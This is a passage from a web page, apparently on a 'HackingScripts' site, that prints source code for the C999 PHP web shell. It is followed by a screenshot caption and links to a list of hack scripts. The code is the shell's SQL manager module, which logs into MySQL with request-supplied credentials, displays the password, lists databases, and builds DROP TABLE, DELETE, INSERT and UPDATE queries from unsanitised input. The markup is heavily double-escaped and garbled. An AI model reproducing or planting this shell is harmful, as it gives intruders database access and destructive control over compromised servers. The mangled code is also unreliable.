<span class="x"> $letters .= &quot;&amp;lt;a onclick=&quot;\&amp;quot;return&quot; href=&quot;\&amp;quot;&amp;quot;.$surl.&amp;quot;act=ls&amp;d=&amp;quot;.urlencode($letter.&amp;quot;:\\&amp;quot;).&amp;quot;\&amp;quot;&amp;quot;.($isdiskette?&amp;quot;&quot;&amp;gt;[ &quot;;</span>
<span class="x"> if ($letter.&quot;:&quot; != $v) {$letters .= $letter;}</span>
<span class="x"> else {$letters .= &quot;&amp;lt;span style=&quot;color: green;&quot;&amp;gt;&quot;.$letter.&quot;&amp;lt;/span&amp;gt;&quot;;}</span>
<span class="x"> $letters .= &quot; ]&amp;lt;/a&amp;gt; &quot;;</span>
<span class="x"> }</span>
<span class="x"> }</span>
<span class="x"> if (!empty($letters)) {echo &quot;&amp;lt;b&amp;gt;Detected drives&amp;lt;/b&amp;gt;: &quot;.$letters.&quot;</span>
<span class="x">&quot;;}</span>
<span class="x">}</span>
<span class="x">if (count($quicklaunch) &amp;gt; 0)</span>
<span class="x">{</span>
<span class="x"> foreach($quicklaunch as $item)</span>
<span class="x"> {</span>
<span class="x"> $item[1] = str_replace(&quot;%d&quot;,urlencode($d),$item[1]);</span>
<span class="x"> $item[1] = str_replace(&quot;%sort&quot;,$sort,$item[1]);</span>
<span class="x"> $v = realpath($d.&quot;..&quot;);</span>
<span class="x"> if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}</span>
<span class="x"> $item[1] = str_replace(&quot;%upd&quot;,urlencode($v),$item[1]);</span>
<span class="x"> echo &quot;&amp;lt;a href=&quot;\&amp;quot;&amp;quot;.$item[1].&amp;quot;\&amp;quot;&quot;&amp;gt;&quot;.$item[0].&quot;&amp;lt;/a&amp;gt;    &quot;;</span>
<span class="x"> }</span>
<span class="x">}</span>
<span class="x">echo &quot;</span>


<span class="x">&quot;;</span>
<span class="x">if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo &quot;&amp;lt;/pre&amp;gt;</span>
<span class="x">&amp;lt;table width=&quot;\&amp;quot;100%\&amp;quot;&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#333333&quot;&amp;gt;</span>
<span class="x">&amp;lt;tbody&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x">&amp;lt;td valign=&quot;\&amp;quot;top\&amp;quot;&quot; width=&quot;\&amp;quot;100%\&amp;quot;&quot;&amp;gt;&quot;.$donated_html.&quot;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;/tbody&amp;gt;</span>
<span class="x">&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;pre&amp;gt;</span>

<span class="x">&quot;;}</span>
<span class="x">echo &quot;&amp;lt;/pre&amp;gt;</span>
<span class="x">&amp;lt;table width=&quot;\&amp;quot;100%\&amp;quot;&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#333333&quot;&amp;gt;</span>
<span class="x">&amp;lt;tbody&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x">&amp;lt;td valign=&quot;\&amp;quot;top\&amp;quot;&quot; width=&quot;\&amp;quot;100%\&amp;quot;&quot;&amp;gt;&quot;;</span>
<span class="x">if ($act == &quot;&quot;) {$act = $dspact = &quot;ls&quot;;}</span>
<span class="x">if ($act == &quot;sql&quot;)</span>
<span class="x">{</span>
<span class="x"> $sql_surl = $surl.&quot;act=sql&quot;;</span>
<span class="x"> if ($sql_login) {$sql_surl .= &quot;&amp;sql_login=&quot;.htmlspecialchars($sql_login);}</span>
<span class="x"> if ($sql_passwd) {$sql_surl .= &quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd);}</span>
<span class="x"> if ($sql_server) {$sql_surl .= &quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server);}</span>
<span class="x"> if ($sql_port) {$sql_surl .= &quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port);}</span>
<span class="x"> if ($sql_db) {$sql_surl .= &quot;&amp;sql_db=&quot;.htmlspecialchars($sql_db);}</span>
<span class="x"> $sql_surl .= &quot;&amp;&quot;;</span>
<span class="x"> ?&gt;</span>
<span class="x">&amp;lt;h3&amp;gt;Attention! SQL-Manager is &amp;lt;span style=&quot;text-decoration: underline;&quot;&amp;gt;NOT&amp;lt;/span&amp;gt; ready module! Don&#39;t reports bugs.&amp;lt;/h3&amp;gt;</span>
<span class="x">&quot;; if (!$sql_sock) {?&gt;</span>
<span class="x">&amp;lt;table style=&quot;border-collapse: collapse;&quot; width=&quot;100%&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#333333&quot;&amp;gt;</span>
<span class="x">&amp;lt;tbody&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x">&amp;lt;td colspan=&quot;2&quot; valign=&quot;top&quot; width=&quot;100%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;!--?php &amp;lt;br ?--&amp;gt; if ($sql_server)</span>
<span class="x"> {</span>
<span class="x"> $sql_sock = mysql_connect($sql_server.&quot;:&quot;.$sql_port, $sql_login, $sql_passwd);</span>
<span class="x"> $err = mysql_smarterror();</span>
<span class="x"> @mysql_select_db($sql_db,$sql_sock);</span>
<span class="x"> if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}</span>
<span class="x"> }</span>
<span class="x"> else {$sql_sock = FALSE;}</span>
<span class="x"> echo &quot;&amp;lt;b&amp;gt;SQL Manager:&amp;lt;/b&amp;gt;</span>
<span class="x">&quot;;</span>
<span class="x"> if (!$sql_sock)</span>
<span class="x"> {</span>
<span class="x"> if (!$sql_server) {echo &quot;NO CONNECTION&quot;;}</span>
<span class="x"> else {echo &quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Can&#39;t connect&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;; echo &quot;&amp;lt;b&amp;gt;&quot;.$err.&quot;&amp;lt;/b&amp;gt;&quot;;}</span>
<span class="x"> }</span>
<span class="x"> else</span>
<span class="x"> {</span>
<span class="x"> $sqlquicklaunch = array();</span>
<span class="x"> $sqlquicklaunch[] = array(&quot;Index&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;&quot;);</span>
<span class="x"> $sqlquicklaunch[] = array(&quot;Query&quot;,$sql_surl.&quot;sql_act=query&amp;sql_tbl=&quot;.urlencode($sql_tbl));</span>
<span class="x"> $sqlquicklaunch[] = array(&quot;Server-status&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=serverstatus&quot;);</span>
<span class="x"> $sqlquicklaunch[] = array(&quot;Server variables&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=servervars&quot;);</span>
<span class="x"> $sqlquicklaunch[] = array(&quot;Processes&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=processes&quot;);</span>
<span class="x"> $sqlquicklaunch[] = array(&quot;Logout&quot;,$surl.&quot;act=sql&quot;);</span>
<span class="x"> echo &quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;MySQL &quot;.mysql_get_server_info().&quot; (proto v.&quot;.mysql_get_proto_info ().&quot;) running in &quot;.htmlspecialchars($sql_server).&quot;:&quot;.htmlspecialchars($sql_port).&quot; as &quot;.htmlspecialchars($sql_login).&quot;@&quot;.htmlspecialchars($sql_server).&quot; (password - \&quot;&quot;.htmlspecialchars($sql_passwd).&quot;\&quot;)&amp;lt;/b&amp;gt;</span>
<span class="x">&quot;;</span>
<span class="x"> if (count($sqlquicklaunch) &amp;gt; 0) {foreach($sqlquicklaunch as $item) {echo &quot;[ &amp;lt;a href=&quot;\&amp;quot;&amp;quot;.$item[1].&amp;quot;\&amp;quot;&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;.$item[0].&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ] &quot;;}}</span>
<span class="x"> echo &quot;&amp;lt;/center&amp;gt;&quot;;</span>
<span class="x"> }</span>
<span class="x"> echo &quot;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x">&amp;lt;td valign=&quot;top&quot; width=&quot;28%&quot; height=&quot;100&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;span style=&quot;font-size: x-large;&quot;&amp;gt; i &amp;lt;/span&amp;gt;&amp;lt;/center&amp;gt;</span>
<span class="x">&amp;lt;ul&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;If login is null, login is owner of process.&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;If host is null, host is localhost&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;If port is null, port is 3306 (default)&amp;lt;/li&amp;gt;</span>
<span class="x">&amp;lt;/ul&amp;gt;</span>
<span class="x">&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td valign=&quot;top&quot; width=&quot;90%&quot; height=&quot;1&quot;&amp;gt;</span>
<span class="x">&amp;lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&amp;gt;</span>
<span class="x">&amp;lt;tbody&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt; &amp;lt;b&amp;gt;Please, fill the form:&amp;lt;/b&amp;gt;</span>
<span class="x">&amp;lt;table&amp;gt;</span>
<span class="x">&amp;lt;tbody&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Username&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Password&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Database&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; maxlength=&quot;64&quot; name=&quot;sql_login&quot; value=&quot;root&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;input type=&quot;password&quot; maxlength=&quot;64&quot; name=&quot;sql_passwd&quot; value=&quot;&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; maxlength=&quot;64&quot; name=&quot;sql_db&quot; value=&quot;&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Host&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;PORT&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td align=&quot;right&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; maxlength=&quot;64&quot; name=&quot;sql_server&quot; value=&quot;localhost&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; maxlength=&quot;6&quot; name=&quot;sql_port&quot; size=&quot;3&quot; value=&quot;3306&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Connect&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;/tbody&amp;gt;</span>
<span class="x">&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;!--?php }  else  {   //Start left panel   if (!empty($sql_db))   {    ?--&amp;gt;</span>
<span class="x">&amp;lt;td valign=&quot;top&quot; width=&quot;25%&quot; height=&quot;100%&quot;&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Home</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>

<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">hr</span> <span class="nx">noshade</span><span class="o">=</span><span class="s2">&quot;noshade&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>

<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">!--?</span><span class="nx">php</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span> <span class="o">?--&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
 <span class="k">else</span>
 <span class="p">{</span>
 <span class="k">echo</span> <span class="s2">&quot;---[ &amp;lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ]---</span>
<span class="s2">&quot;</span><span class="p">;</span>
 <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM &quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;� &amp;lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">sql_db</span><span class="o">=&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">sql_tbl</span><span class="o">=&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; (&quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="nv">$c</span><span class="o">++</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;No tables found in database.&quot;</span><span class="p">;}</span>
 <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">else</span>
 <span class="p">{</span>
 <span class="cp">?&gt;</span><span class="x">&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td valign=&quot;top&quot; width=&quot;1&quot; height=&quot;100&quot;&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;b&amp;gt;Home&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;</span>

<span class="x">&amp;lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot; /&amp;gt;</span>

<span class="x">&amp;lt;!--?php    $result = mysql_list_dbs($sql_sock);    if (!$result) {echo mysql_smarterror();}    else    {     ?--&amp;gt;</span>
<span class="x">&amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;&amp;lt;!--?php &amp;lt;br ?--&amp;gt; $c = 0;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;$dbs = &quot;&quot;;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;while ($row = mysql_fetch_row($result)) {$dbs .= &quot;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;&amp;lt;option selected=&quot;selected&quot; value=&quot;\&amp;quot;&amp;quot;.$row[0].&amp;quot;\&amp;quot;&amp;quot;;&quot;&amp;gt;&quot;.$row[0].&quot;&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;&quot;; $c++;}&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;echo &quot;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;&amp;lt;option value=&quot;\&amp;quot;\&amp;quot;&quot;&amp;gt;Databases (&quot;.$c.&quot;)&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;&quot;;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;echo $dbs;&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;}&amp;lt;/select&amp;gt;</span>
<span class="x">&amp;lt;select name=&quot;sql_db&quot;&amp;gt;?&gt;&amp;lt;/select&amp;gt;</span>

<span class="x">&amp;lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot; /&amp;gt;</span>

<span class="x">Please, select database</span>

<span class="x">&amp;lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot; /&amp;gt;</span>

<span class="x">&amp;lt;input type=&quot;submit&quot; value=&quot;Go&quot; /&amp;gt;&amp;lt;/form&amp;gt;</span>
<span class="x">&amp;lt;!--?php &amp;lt;br ?--&amp;gt; }</span>
<span class="x"> //End left panel</span>
<span class="x"> echo &quot;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;td valign=&quot;\&amp;quot;top\&amp;quot;&quot; width=&quot;\&amp;quot;100%\&amp;quot;&quot; height=&quot;\&amp;quot;1\&amp;quot;&quot;&amp;gt;&quot;;</span>
<span class="x"> //Start center panel</span>
<span class="x"> $diplay = TRUE;</span>
<span class="x"> if ($sql_db)</span>
<span class="x"> {</span>
<span class="x"> if (!is_numeric($c)) {$c = 0;}</span>
<span class="x"> if ($c == 0) {$c = &quot;no&quot;;}</span>
<span class="x"> echo &quot;</span>

<span class="x">&amp;lt;hr noshade=&quot;noshade&quot; size=&quot;\&amp;quot;1\&amp;quot;&quot; /&amp;gt;</span>

<span class="x">&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;There are &quot;.$c.&quot; table(s) in this DB (&quot;.htmlspecialchars($sql_db).&quot;).</span>
<span class="x">&quot;;</span>
<span class="x"> if (count($dbquicklaunch) &amp;gt; 0) {foreach($dbsqlquicklaunch as $item) {echo &quot;[ &amp;lt;a href=&quot;\&amp;quot;&amp;quot;.$item[1].&amp;quot;\&amp;quot;&quot;&amp;gt;&quot;.$item[0].&quot;&amp;lt;/a&amp;gt; ] &quot;;}}</span>
<span class="x"> echo &quot;&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;;</span>
<span class="x"> $acts = array(&quot;&quot;,&quot;dump&quot;);</span>
<span class="x"> if ($sql_act == &quot;tbldrop&quot;) {$sql_query = &quot;DROP TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="x"> elseif ($sql_act == &quot;tblempty&quot;) {$sql_query = &quot;&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;DELETE FROM `&quot;.$v.&quot;` \n&quot;;} $sql_act = &quot;query&quot;;}</span>
<span class="x"> elseif ($sql_act == &quot;tbldump&quot;) {if (count($boxtbl) &amp;gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = &quot;dump&quot;;}</span>
<span class="x"> elseif ($sql_act == &quot;tblcheck&quot;) {$sql_query = &quot;CHECK TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="x"> elseif ($sql_act == &quot;tbloptimize&quot;) {$sql_query = &quot;OPTIMIZE TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="x"> elseif ($sql_act == &quot;tblrepair&quot;) {$sql_query = &quot;REPAIR TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="x"> elseif ($sql_act == &quot;tblanalyze&quot;) {$sql_query = &quot;ANALYZE TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="x"> elseif ($sql_act == &quot;deleterow&quot;) {$sql_query = &quot;&quot;; if (!empty($boxrow_all)) {$sql_query = &quot;DELETE * FROM `&quot;.$sql_tbl.&quot;`;&quot;;} else {foreach($boxrow as $v) {$sql_query .= &quot;DELETE * FROM `&quot;.$sql_tbl.&quot;` WHERE&quot;.$v.&quot; LIMIT 1;\n&quot;;} $sql_query = substr($sql_query,0,-1);} $sql_act = &quot;query&quot;;}</span>
<span class="x"> elseif ($sql_tbl_act == &quot;insert&quot;)</span>
<span class="x"> {</span>
<span class="x"> if ($sql_tbl_insert_radio == 1)</span>
<span class="x"> {</span>
<span class="x"> $keys = &quot;&quot;;</span>
<span class="x"> $akeys = array_keys($sql_tbl_insert);</span>
<span class="x"> foreach ($akeys as $v) {$keys .= &quot;`&quot;.addslashes($v).&quot;`, &quot;;}</span>
<span class="x"> if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}</span>
<span class="x"> $values = &quot;&quot;;</span>
<span class="x"> $i = 0;</span>
<span class="x"> foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct.&quot; (&quot;;} $values .= &quot;&#39;&quot;.addslashes($v).&quot;&#39;&quot;; if ($funct) {$values .= &quot;)&quot;;} $values .= &quot;, &quot;; $i++;}</span>
<span class="x"> if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}</span>
<span class="x"> $sql_query = &quot;INSERT INTO `&quot;.$sql_tbl.&quot;` ( &quot;.$keys.&quot; ) VALUES ( &quot;.$values.&quot; );&quot;;</span>
<span class="x"> $sql_act = &quot;query&quot;;</span>
<span class="x"> $sql_tbl_act = &quot;browse&quot;;</span>
<span class="x"> }</span>
<span class="x"> elseif ($sql_tbl_insert_radio == 2)</span>
<span class="x"> {</span>
<span class="x"> $set = mysql_buildwhere($sql_tbl_insert,&quot;, &quot;,$sql_tbl_insert_functs);</span>
<span class="x"> $sql_query = &quot;UPDATE `&quot;.$sql_tbl.&quot;` SET &quot;.$set.&quot; WHERE &quot;.$sql_tbl_insert_q.&quot; LIMIT 1;&quot;;</span>
<span class="x"> $result = mysql_query($sql_query)</span>
<span class="x">?&gt;</span></code></pre></div>

<h3>C999 shell Screenshot<figure id="attachment_323" style="width: 604px;" class="wp-caption aligncenter"></h3>

<p><a href="/HackingScripts/wp-content/uploads/2014/01/c999.png"><img src="/HackingScripts/wp-content/uploads/2014/01/c999-1024x511.png" alt="C999 shell script screenshot" width="604" height="301" class="size-large wp-image-323" /></a><figcaption class="wp-caption-text">C999 shell script screenshot</figcaption></figure></p>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

